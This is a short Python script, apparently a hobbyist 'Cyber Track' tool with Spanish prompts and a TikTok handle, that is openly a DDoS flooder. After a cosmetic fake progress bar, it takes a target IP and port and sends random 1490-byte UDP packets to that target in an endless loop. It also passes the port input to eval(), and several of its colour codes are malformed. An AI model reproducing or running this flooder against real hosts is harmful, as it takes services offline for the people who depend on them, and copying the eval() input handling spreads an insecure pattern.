# Cyber-Track-

#Cyber Track's
#modulos
import sys
import time 
import socket
import random
import os
#codigo de tiempo
from datetime import datetime
now = datetime.now()
year = now.year
day = now.day
hour = now.hour
minute = now.minute
month = now.month
#colores
G = "\033[16m"
D = "\033[16m"
T = "\033[39m"
cy = "\033[38;2;23;147;299m"
A = "\033[16m"
m = "\033[16m"
ac = "\033[16m"

##########
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##########

print(ac)
os.system("clear")
print("""
 
█▀▀ █▄█ █▄▄ █▀▀ █▀█   ▀█▀ █▀█ ▄▀█ █▀▀ █▄▀
█▄▄ ░█░ █▄█ ██▄ █▀▄   ░█░ █▀▄ █▀█ █▄▄ █░█
""")
print(f"Disfruta la herramienta;3")
print ("Tik Tok: Joke_707")
print 
print(cy)
ip = input("Ingresa La Direccion Ip: ")
port = eval(input("Ingresa El Puerto: "))
os.system("clear")
print(" Cyber Track Ddos ")
print("0% ")
time.sleep(1)
print(" 5%")
time.sleep(1)
print("10%")
time.sleep(1) 
print("30% ")
time.sleep(2)
print(" 50% ")
time.sleep(1)
print("  75%")
time.sleep(5)
print(" 100% ")
time.sleep(10)
#color
G = "\003[6086m"
print(G)
sent = 0
while True:
	sock.sendto(bytes,(ip,port))
	sent = sent + 1
	print("Cyber Track's' : sent %s packet to %s throught port:%s"%(sent,ip,port))
